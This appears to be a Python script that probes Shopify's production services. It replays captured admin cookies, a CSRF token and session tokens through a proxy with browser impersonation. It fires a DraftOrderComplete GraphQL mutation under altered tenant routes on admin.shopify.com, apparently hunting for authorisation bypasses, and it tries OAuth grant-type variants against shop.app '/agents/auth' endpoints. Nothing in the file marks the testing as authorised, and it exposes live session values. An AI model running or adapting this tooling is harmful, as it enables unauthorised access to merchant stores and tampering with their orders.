# -*- coding: utf-8 -*-
"""1) GraphQL tenant 类型路由探测(shopify/partner/org/merchant...)
2) /agents/auth/* 独立 token 系统参数变体
"""
import hashlib
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
    "Sec-CH-UA-Mobile": "?0",
    "Sec-CH-UA-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

HASH = "12af77c8135a10656e3cf14cb69d746505a1df3b62c08faea80a0a3949c21f8d"
BODY = {
    "operationName": "DraftOrderComplete",
    "variables": {"id": "gid://shopify/DraftOrder/1102015168554", "paymentPending": True,
                  "paymentGatewayId": None, "sourceName": "shopify_draft_orders", "bypassCartValidations": False},
    "extensions": {"client_context": {"page_view_token": "81a384a6-1a26-4f04-93a2-faca565b1f40",
        "client_route_handle": "draftOrders:show", "client_pathname": "/store/jqpkdm-kb/draft_orders/1102015168554",
        "client_normalized_pathname": "/store/:storeHandle/draft_orders/:id",
        "shopify_session_token": "0f6832a6-1f3c-40ef-805e-29f861ec7367",
        "shopify_multitrack_token": "34b29e38-9809-47b2-ac03-64535d399fdd"}},
}

def gql_tenant_probe():
    print("== GraphQL tenant 路由探测 ==")
    variants = [
        ("shopify", "jqpkdm-kb"),
        ("partner", "jqpkdm-kb"),
        ("org", "jqpkdm-kb"),
        ("organization", "jqpkdm-kb"),
        ("merchant", "jqpkdm-kb"),
        ("staff", "jqpkdm-kb"),
        ("shop", "jqpkdm-kb"),
        ("stores", "jqpkdm-kb"),
        ("shopify", "73342484522"),  # shop_id 数字
    ]
    for tenant, ident in variants:
        url = f"https://admin.shopify.com/api/operations/{HASH}/DraftOrderComplete/{tenant}/{ident}"
        try:
            r = requests.post(url, json=BODY, headers=H, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=25)
            print(f"[{tenant}/{ident}] HTTP {r.status_code} | {r.text[:120]}")
        except Exception as e:
            print(f"[{tenant}/{ident}] ERROR {e}")

def agents_auth_probe():
    print("\n== /agents/auth/* 变体 ==")
    base = {
        "User-Agent": H["User-Agent"],
        "Accept": "application/json",
        "Content-Type": "application/json",
    }
    tests = [
        ("POST device-code w/client_id", "https://shop.app/agents/auth/device-code",
         {"client_id": "5c733ab2-1903-400a-891e-7ba20c09e2a3", "scope": "openid email personal_agent", "device_name": "test"}),
        ("POST device-code form", "https://shop.app/agents/auth/device-code",
         None, {"client_id": "5c733ab2-1903-400a-891e-7ba20c09e2a3", "scope": "openid", "device_name": "t"}),
        ("POST token grant_type=device_code", "https://shop.app/agents/auth/token",
         {"grant_type": "urn:ietf:params:oauth:grant-type:device_code", "device_code": "AAAA1111", "client_id": "5c733ab2-1903-400a-891e-7ba20c09e2a3"}),
        ("POST token grant_type=password", "https://shop.app/agents/auth/token",
         {"grant_type": "password", "username": "a@b.com", "password": "x"}),
        ("POST token grant_type=client_credentials", "https://shop.app/agents/auth/token",
         {"grant_type": "client_credentials", "client_id": "5c733ab2-1903-400a-891e-7ba20c09e2a3"}),
        ("GET device-code", "https://shop.app/agents/auth/device-code", None),
        ("GET token", "https://shop.app/agents/auth/token", None),
    ]
    for label, url, j, form in [(t[0], t[1], t[2], t[3] if len(t) > 3 else None) for t in tests]:
        try:
            if j is not None:
                r = requests.post(url, json=j, headers=base, proxies=PROXY, impersonate="chrome", timeout=25)
            elif form is not None:
                hh = dict(base); hh["Content-Type"] = "application/x-www-form-urlencoded"
                r = requests.post(url, data=form, headers=hh, proxies=PROXY, impersonate="chrome", timeout=25)
            else:
                r = requests.get(url, headers=base, proxies=PROXY, impersonate="chrome", timeout=25)
            print(f"[{label}] HTTP {r.status_code} | {r.text[:150]}")
        except Exception as e:
            print(f"[{label}] ERROR {e}")

if __name__ == "__main__":
    gql_tenant_probe()
    agents_auth_probe()
